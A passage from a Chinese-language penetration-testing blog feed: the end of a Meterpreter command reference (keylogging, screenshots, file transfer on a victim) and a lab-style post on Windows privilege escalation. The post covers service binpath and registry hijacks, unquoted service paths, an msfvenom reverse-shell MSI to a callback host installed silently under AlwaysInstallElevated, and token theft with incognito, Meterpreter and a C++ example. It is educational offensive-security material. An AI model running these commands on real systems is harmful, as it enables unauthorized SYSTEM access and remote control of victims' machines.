文件中的值<br></code></pre></td></tr></table></figure><p><strong>用户界面命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">enumdesktops -列出所有可访问台式机<br>getdesktop -获取当前的 meterpreter 桌面<br>idletime -检查长时间以来，受害者系统空闲进程<br>keyscan_dump -键盘记录软件的内容转储<br>keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件<br>keyscan_stop -停止键盘记录软件<br>screenshot-抓去 meterpreter 桌面的屏幕截图<br>set_desktop -更改 meterpreter 桌面<br>uictl -启用用户界面组件的一些控件<br></code></pre></td></tr></table></figure><p><strong>网络命令</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。<br>portfwd -端口转发<br>route -查看或修改受害者路由表<br></code></pre></td></tr></table></figure><p><strong>文件系统命令</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat -读取并输出到标准输出文件的内容<br>cd -更改目录对受害人<br>del -删除文件对受害人<br>download-从受害者系统文件下载<br>edit-用 vim编辑文件<br>getlwd -打印本地目录<br>getwd -打印工作目录<br>lcd -更改本地目录<br>lpwd -打印本地目录<br>ls -列出在当前目录中的文件列表<br>mkdir -在受害者系统上的创建目录<br>pwd -输出工作目录<br>rm -删除文件<br>rmdir -受害者系统上删除目录<br>upload-从攻击者的系统往受害者系统上传文件<br></code></pre></td></tr></table></figure><p><strong>帮助菜单</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">background – 将当前会话移动到背景<br>bgkill – 杀死一个背景 meterpreter 脚本<br>bglist – 提供所有正在运行的后台脚本的列表<br>bgrun – 作为一个后台线程运行脚本<br>channel – 显示活动频道<br>close – 关闭通道<br>exit – 终止 meterpreter 会话<br>help – 帮助菜单<br>interact – 与通道进行交互<br>irb – 进入 Ruby 脚本模式<br>migrate – 移动到一个指定的 PID 的活动进程，也就是注入进程<br>quit – 终止 meterpreter 会话<br>read – 从通道读取数据<br>run – 执行以后它选定的 meterpreter 脚本<br>use – 加载 meterpreter 的扩展<br>write – 将数据写入到一个通道<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-权限提升</title>
      <link href="/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>权限提升可以分为横向权限提升和垂直权限提升，前者是指同级用户，后者是指低级用户到高级用户。</p></blockquote><h1 id="系统内核漏洞提权"><a href="#系统内核漏洞提权" class="headerlink" title="系统内核漏洞提权"></a>系统内核漏洞提权</h1><p>当目标系统存在该漏洞且没有更新安全补丁时，利用已知的系统内核漏洞进行提权测试人员往往可以获得系统级别的访问权限。</p><h2 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h2><p><strong>手动查找</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systeminfo<br></code></pre></td></tr></table></figure><p>可以利用该命令查看系统安装的补丁</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326091200716.png" alt="image-20240326091200716"></p><p>然后可以结合系统版本信息，借助辅助工具寻找可用的提权漏洞。</p><p><strong>借助WES-NG查找可用漏洞</strong></p><p>项目地址：<a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>使用方法：</p><ol><li><p>执行下面命令更新漏洞库数据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py --update<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326092255515.png" alt="image-20240326092255515"></p></li><li><p>在目标主机执行systeminfo命令，并将结果保存到sysinfo.txt中，然后执行下面命令，用WES-NG进行检查</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--impact指定漏洞类型为提权漏洞</span><br></code></pre></td></tr></table></figure><p>emmm我的win7systeminfo文件跑出来什么都没有，跑了一下我的win11竟然有cve没绷住</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326160918537.png" alt="image-20240326160918537"></p><p>执行下面命令查找所有已公开EXP的提权漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240326161002020.png" alt="image-20240326161002020"></p></li></ol><h2 id="确定并利用漏洞"><a href="#确定并利用漏洞" class="headerlink" title="确定并利用漏洞"></a>确定并利用漏洞</h2><p>确定漏洞之后，就去找利用程序然后上传利用进行提权。</p><h1 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h1><p>通常情况下，用户安装的一些应用软件会在本地注册一些服务，并且大多数服务在计算机开机时以系统SYSTEM 权限启动。应用软件在注册服务时，会在以下路径中创建相应的注册表项,路径如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327103308958.png" alt="image-20240327103308958"></p><p>其中的ImagePath指向启动系统服务的二进制程序路径</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327103611189.png" alt="image-20240327103611189"></p><p>如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，这是利用系统服务提权的主要思路。</p><h2 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h2><p>ACL 定义了安全对象的访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限。Windows 的系统服务正是通过 ACL 来指定用户对其拥有的权限，常见的权限列表如下：</p><table><thead><tr><th>权限</th><th>说明</th></tr></thead><tbody><tr><td>SERVICE_START</td><td>启动服务的权限</td></tr><tr><td>SERVICE_STOP</td><td>停止服务的权限</td></tr><tr><td>SERVICE_PAUSE_CONTINUE</td><td>暂停&#x2F;继续运行服务的权限</td></tr><tr><td>SERVICE_QUERY_STATUS</td><td>查询服务状态的权限</td></tr><tr><td>SERVICE_QUERY_CONFIG</td><td>查询服务配置的权限</td></tr><tr><td>SERVICE_CHANGE_CONFIG</td><td>更改服务配置的权限</td></tr><tr><td>SERVICE_ALL_ACCESS</td><td>完全控制权限</td></tr></tbody></table><p>如果用户在配置服务时使得低权限用户对高权限下运行的系统服务拥有更改服务配置的权限，我们就可以直接修改系统服务启动时的二进制文件路径。</p><blockquote><p>AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限。</p><p>工具地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p></blockquote><p>低权限用户可以检查“Authenticated Users”组和“INTERACTIVE”组对系统服务的权限。前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户；后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户。默认情况下，这两个组为计算机本地“Users”组的成员。</p><p>执行下面命令枚举”Authenticated Users”组是否具有更改服务配置的权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uwcqv: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br><br>u: 显示所属用户（Owner）信息。<br>w: 显示子对象的权限。<br>c: 显示所选对象的ACL（访问控制列表）信息。<br>q: 静默模式，只显示结果而不显示头部信息。<br>v: 显示详细信息。<br></code></pre></td></tr></table></figure><p>我在本机没有找到有更改权限的用户</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327105943719.png" alt="image-20240327105943719"></p><p>以书上例子在找到权限的情况下应该如何利用：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327112003498.png" alt="image-20240327112003498"></p><p>可以看到该组对InsproSvc服务具有更改服务配置的权限，然后执行下面的命令，我们就可以将该服务启动时执行的二进制文件替换为我们上传的攻击载荷</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">binpath，指定服务的二进制文件路径，注意“=”后必须有一个空格</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327112213382.png" alt="image-20240327112213382"></p><p>如果当前用户对该服务拥有SERVICE_STOP和SERVICE_START权限，即我们拥有可以重启服务的权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc stop &lt;service name&gt;<br>sc start &lt;service name&gt;<br></code></pre></td></tr></table></figure><h2 id="服务注册表权限脆弱"><a href="#服务注册表权限脆弱" class="headerlink" title="服务注册表权限脆弱"></a>服务注册表权限脆弱</h2><p>Windows 的注册表中存储了每个系统服务的条目，而注册表使用 ACL 来管理用户对其所拥有的访问权限。如果注册表的 ACL配置错误，使得一个低权限用户对服务的注册表拥有写入权限，此时可以通过修改注册表来更改服务配置。例如修改注册表中的ImagePath键。</p><ol><li><p>执行下面命令枚举”Authenticated Users”是否具有服务注册表写入权限的用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -uvwqk &quot;Authenticated Users&quot; HKLM\SYSTEM\CurrentControlSet\Services<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-uvwqk: 这些选项表示 AccessChk 将以详细格式显示对象的安全描述符信息。每个选项的含义如下：<br>u: 显示所属用户（Owner）信息。<br>v: 显示所选对象的详细信息。<br>w: 深入显示子项的信息（递归检查）。<br>q: 静默模式，只显示结果而不显示头部信息。<br>k: 同意许可证。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327214529644.png" alt="image-20240327214529644"></p></li><li><p>该用户组对RegSvc服务的注册表具有完全控制权限，所以我们可以执行下面命令将注册表中的ImagePath键指向我们上传的攻击载荷</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add HKLM\SYSTEM\CurrentControlSet\Services\RegSvc /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/v：指定要添加或修改的注册表值的名称。<br>/t：指定注册表值的类型。在这里是REG_EXPAND_SZ，表示该值包含可扩展的字符串。<br>/d：指定要设置的数据值。<br>/f：在执行命令时强制执行，即不进行提示确认操作。<br></code></pre></td></tr></table></figure></li><li><p>执行下面命令检查当前用户对该服务是否有重启权限：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula -ucqv &quot;Authenticated Users&quot; RegSvc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327215915634.png" alt="image-20240327215915634"></p><p>然后我们就可以重启服务进行提权</p></li></ol><h2 id="服务路径权限可控"><a href="#服务路径权限可控" class="headerlink" title="服务路径权限可控"></a>服务路径权限可控</h2><p>如果目标主机上用户存在错误配置或操作，使得一个低权限的用户对此服务调用的二进制文件或其所在目录拥有写入权限，那么可以直接将该文件替换成攻击载荷，并随着服务的启动继承系统权限。</p><ol><li><p>执行下面命令查看InsexeSvc这个服务的二进制文件所在的目录是否有写入权限</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula /quv &quot;C:\Program Files\Insecure Executables\&quot; <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327221559789.png" alt="image-20240327221559789"></p></li><li><p>结果中看到”INTERACTIVE”组对该文件夹具有完全控制权限、</p><p>该组包含所有能够登录到系统的成员。此时，测试人员可以将InsexeSvc 服务的二进制文件替换成一个同名的攻击载荷，并随着服务的重启继承系统权限</p></li></ol><h2 id="未引用的服务路径"><a href="#未引用的服务路径" class="headerlink" title="未引用的服务路径"></a>未引用的服务路径</h2><p>未引用的服务路径(Unquoted Service Path)漏洞曾被称为可信任的服务路径(TrustedService Path)，利用了 Windows 文件路径解析的特性。当服务启动所执行的二进制文件的路径中包含空格且未有效包含在引号中时，就会导致该漏洞。</p><p>造成该漏洞的根本原因在于 Windows 系统中用于创建进程的 CreateProcess 函数。</p><p>如果完整路径中包含空格且未有效包含在引号中，那么对于该路径中的每个空格Windows 会按照从左到右的顺序依次尝试寻找并执行与空格前的名字相匹配的程序。例如,对于路径 C:\Program Files\Sub Dir\Program Name.exe,系统依次寻找并执行以下程序C:\Program.exe，C:Program Files\Sub.exe ，C:\Program Files\Sub Dir\Program.exe，C:\Program Files\Sub Dir\Program Name.exe 。</p><blockquote><p>当系统进行该路径尝试的时候，会以当前服务所拥有的权限进行。所以当对受影响的目录具有写入权限时，可以上传一个特殊命名的攻击载荷到该目录中</p></blockquote><ol><li><p>执行下面命令枚举主机上所有有该漏洞的服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327223437698.png" alt="image-20240327223437698"></p><p>可知UnquoteSvc这个服务的路径有空格且没有引号包裹</p></li><li><p>用Accesschk检查该受影响的目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">accesschk.exe /accepteula  -quv &quot;Authenticated Users&quot; &quot;C:\Program Files\Unquoted Path\&quot; <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327224123522.png" alt="image-20240327224123522"></p><p>这个时候就可以向该目录上传一个Sub.exe的攻击载荷，检查到这里的时候就会以SYSTEM权限执行Sub.exe程序。</p></li></ol><h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>powerup就是一个powershell脚本，里面集中了上面所说的所有方法。使用方法可以去看官方文档</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p><p>这里有一篇使用的文章：<a href="https://blog.51cto.com/binghe001/5247921">https://blog.51cto.com/binghe001/5247921</a></p><h1 id="MSI安装策略提权"><a href="#MSI安装策略提权" class="headerlink" title="MSI安装策略提权"></a>MSI安装策略提权</h1><p>MSI安装策略提权是由于用户在配置MSI安装策略时，启用了**“永远以高特权进行安装”(AlwaysInstallElevated，默认情况下为禁用状态)**，使得任何权限的用户都可以通过 SYSTEM 权限安装MSI程序。此时测试人员可以在目标主机上安装一个预先制作的恶意MSI文件，以获得SYSTEM 权限。</p><blockquote><p>MSI（Microsoft Installer）是一种用于 Windows 操作系统的安装包格式，MSI 安装策略指的是针对 MSI 安装程序的一系列安装和配置规则。以下是一些常见的 MSI 安装策略：</p><ol><li><strong>组策略（Group Policy）</strong>：管理员可以使用组策略来指定计算机或用户级别的 MSI 安装策略，例如允许或禁止特定程序的安装、配置安装包位置等。</li><li><strong>静默安装（Silent Installation）</strong>：通过在命令行中使用特定参数，可以实现无需用户干预的 MSI 静默安装。这种安装方式通常用于批量部署软件。</li><li><strong>卸载策略</strong>：管理员可以指定卸载 MSI 软件的策略，包括是否允许用户卸载软件、是否强制卸载等。</li><li><strong>修补策略（Patch Policy）</strong>：允许管理员为已安装的 MSI 软件应用修补程序，以解决漏洞或增加功能。管理员可以规定哪些修补程序允许应用、如何应用修补程序等。</li><li><strong>升级策略（Upgrade Policy）</strong>：管理员可以定义升级策略来升级已安装的软件版本，以确保网络上的计算机都在运行最新版本。</li><li><strong>限制策略（Restriction Policy）</strong>：可以通过策略限制哪些用户或计算机可以安装某个 MSI 软件，从而控制软件的分发和访问权限。</li></ol><p>MSI实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和程序数据</p></blockquote><h2 id="确定系统是否存在漏洞"><a href="#确定系统是否存在漏洞" class="headerlink" title="确定系统是否存在漏洞"></a>确定系统是否存在漏洞</h2><p>如果用户配置了”永远以高特权进行安装”，会在注册表下面两个位置创建键值1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br>HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p>可以执行下面的命令进行确认是否开启该特权</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231001600.png" alt="image-20240327231001600"></p><h2 id="创建恶意MSI并安装"><a href="#创建恶意MSI并安装" class="headerlink" title="创建恶意MSI并安装"></a>创建恶意MSI并安装</h2><p>确定目标系统存在该漏洞后，使用MetaSploit自动生成MSI</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.147 LPORT=4444 -f msi -o reverse_tcp.msi<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231406326.png" alt="image-20240327231406326"></p><p>在现有的 Meterpreter 会话中将创建的MSI文件上传到目标计算机，执行以下命令:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msiexec /quiet /qn /i reverse_tcp.msi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/quiet，在安装期间禁止向用户发送任何消息；/qn，无GUI模式允许；/i，常规安装</span><br></code></pre></td></tr></table></figure><p>最终提权如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231615328.png" alt="image-20240327231615328"></p><h1 id="访问令牌操纵"><a href="#访问令牌操纵" class="headerlink" title="访问令牌操纵"></a>访问令牌操纵</h1><p>Windows 操作系统的访问控制模型(Access Control Model)是 Windows 系统安全性的基础构件，由访问令牌(Access Token)和安全描述符(Security Descriptor)两部分组成，二者分别被访问者和被访问者所持有。通过比较访问令牌和安全描述符的内容Windows 可以对访问者是否拥有访问资源对象的能力进行判定。</p><h2 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h2><p>当用户登录时，如果验证通过就会为用户创建一个访问令牌，包括登录过程返回的SID以及由本地安全策略分配给用户和用户所属安全组的特权列表。代表该用户执行的每个进程都有此访问令牌的副本。</p><p>Windows 中的令牌可以分为主令牌(Primary Token)和模拟令牌(Impersonation Token)。主令牌与进程相关联，是由 Windows内核创建并分配给进程的默认访问令牌。主令牌与进程相关联，是由Windows内核创建并分配给进程的默认访问令牌。<strong>每个进程都有一个主令牌</strong>，描述了与当前进程关联的用户账户的安全上下文。</p><p>当进程与安全对象进行交互的时候，系统将使用主令牌；此外，线程可以模拟客户端账户，模拟是指线程在安全上下文中执行的能力，并且该上下文不同于拥有该线程的进程的上下文。<strong>当线程模拟客户端时，模拟线程将同时具有主访问令牌和模拟令牌。</strong></p><blockquote><p>通过操纵访问令牌，使当前的进程看起来像是其他进程所启动的子进程或者其他用户所启动的进程；使用内置的Windows API从指定的进程中复制访问令牌来用于现有进程或者生成新进程，并以此来绕过访问控制，提升权限，<strong>这个过程叫做令牌窃取。</strong></p></blockquote><p>内置API：</p><table><thead><tr><th>Win32 API</th><th>说明</th></tr></thead><tbody><tr><td>OpenProcess</td><td>根据提供的进程ID获取指定进程的句柄</td></tr><tr><td>OpenProcessToken</td><td>获取与指定进程相关联的访问令牌的句柄</td></tr><tr><td>DuplicateTokenEx</td><td>复制现有的访问令牌以创建一个新的访问令牌，包括创建主令牌或模拟令牌</td></tr><tr><td>ImpersonateLoggedOnUser</td><td>调用线程来模拟登录用户的访问令牌的安全上下文</td></tr><tr><td>CreateProcessWithTokenW</td><td>创建一个新进程及其主线程，新进程在指定令牌的安全上下文中运行</td></tr><tr><td>CreateProcessAsUserA</td><td>创建一个新进程及其主线程，新进程在由指定令牌表示的用户的安全上下文中运行</td></tr></tbody></table><p>这是一个使用api复制令牌的程序示例：</p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DWORD pid = <span class="hljs-number">1234</span>; <span class="hljs-comment">// 替换为目标进程的进程ID</span><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法打开目标进程，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hToken;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &amp;hToken)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法获取目标进程的访问令牌，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    HANDLE hTokenDuplicate;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">DuplicateTokenEx</span>(hToken, MAXIMUM_ALLOWED, <span class="hljs-literal">NULL</span>, SecurityImpersonation, TokenImpersonation, &amp;hTokenDuplicate)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法复制访问令牌，错误码：&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;成功复制访问令牌！&quot;</span> &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 这里可以使用复制的令牌进行操作</span><br><br>    <span class="hljs-built_in">CloseHandle</span>(hToken);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-built_in">CloseHandle</span>(hTokenDuplicate);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意，令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的CreateProcessWithTokenW和 CreateProcessAsUserA 两个 WindowsAPI分别要求用户必须拥有SeImpersonatePrivilege和 SeAssignPrimaryTokenPrivilege&#x2F;SeIncreaseQuotaPrivilege 特权，而拥有这两个特权的用户一般为系统管理员账户、网络服务账户和系统服务账户(如IIS、MSSQL 等)。</p></blockquote><h2 id="常规令牌窃取操作"><a href="#常规令牌窃取操作" class="headerlink" title="常规令牌窃取操作"></a>常规令牌窃取操作</h2><p>常规的令牌窃取操作往往用来将从管理员权限提升至SYSTEM、TrustedInstaller 等更高的系统权限。在实战中，如果本地管理员账户因为某些组策略设置无法获取某些特权，可以通过令牌窃取来假冒 NT AUTHORITY\SYSTEM 的令牌，以获取更高的系统权限。此外，令牌窃取还经常被用于降权或用户切换等操作。</p><p><strong>利用incognito.exe窃取令牌</strong></p><p>工具地址：<a href="https://github.com/milkdevil/incognito2/blob/master/incognito.exe">https://github.com/milkdevil/incognito2/blob/master/incognito.exe</a></p><p>下面命令列举当前主机上的所有令牌：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe list_tokens -u<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328230830862.png" alt="image-20240328230830862"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami<br><span class="hljs-meta prompt_"># </span><span class="language-bash">-c 参数后为要窃取的令牌；<span class="hljs-built_in">whoami</span>为窃取令牌后要执行的命令</span><br></code></pre></td></tr></table></figure><p>该命令窃取目标账户的访问令牌并创建进程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328231014201.png" alt="image-20240328231014201"></p><p>执行下面命令可以直接实现用户的切换。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240328231224386.png" alt="image-20240328231224386"></p><p><strong>利用MetaSploit窃取令牌</strong></p><p>如果获取了Meterpreter，就可以进行令牌窃取等系列操作</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">load incognito  # 加载incognito模块<br>list_tokens -u    #列出主机上的所有访问令牌<br>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #窃取NT AUTHORITY\SYSTEM账户的令牌<br>steal_token &lt;PID&gt;     #从指定的进程中窃取令牌<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329103055609.png" alt="image-20240329103055609"></p><p><strong>利用令牌获取TrustedInstaller权限</strong></p><p>SYSTEM权限为Windows系统中的最高权限，但是即便获取了该权限也不能修改Windows的系统文件。</p><p>例如，C:\Windows\servicing目录即使拥有 SYSTEM权限也无法向该目录写入文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329141219861.png" alt="image-20240329141219861"></p><p>我们可以用icacls查看一下该目录的权限：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">icacls &quot;C:\Windows\servicing&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329141552795.png" alt="image-20240329141552795"></p><p>发现 NT SERVICE\TrustedInstaller 账户对其具有完全控制权限</p><blockquote><p>从 Windows Vista 开始系统内置了一个 TrustedInstaller 安全主体，拥有修改系统文件权限，专用于对系统进行维护、更新等操作。TrustedInstaller 以一个账户组的形式出现即 NT SERVICE\TrustedInstaller。</p></blockquote><p>TrustedInstaller本身也是一个服务，启动该服务是会运行TrustedInstaller.exe程序，该程序的路径为“C:\Windows\servicing\TrustedInstaller.exe”</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329143249885.png" alt="image-20240329143249885"></p><p>其拥有者就是NT SERVICE\TrustedInstaller；所以我们可以窃取该进程的令牌来获得修改系统文件的权限。</p><p>然后我们执行下面命令先启动该服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc start TrustedInstaller<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329143614256.png" alt="image-20240329143614256"></p><p>然后在meterpreter中利用上面的pid窃取令牌</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">steal_token &lt;PID&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240329143700500.png" alt="image-20240329143700500"></p><h1 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h1><p>Potato家族是一种常用的提权技术，通过操纵访问令牌将已获取的Windows服务账户权限提升至系统SYSTEM权限。</p><p>Potato 家族是通过滥用前面令牌窃取提到的两个前提特权，将已获取的 NT AUTHORITY\SYSTEM 账户的访问令牌传入CreateProcessWithTokenW或CreateProcessAsUserA函数进行调用，从而在NT AUTHORITY\SYSTEM 账户的上下文创建新进程，以提升至SYSTEM权限。</p><blockquote><p>在实战场景中，若成功拿到了IIS等服务的 WebShell 或者通过 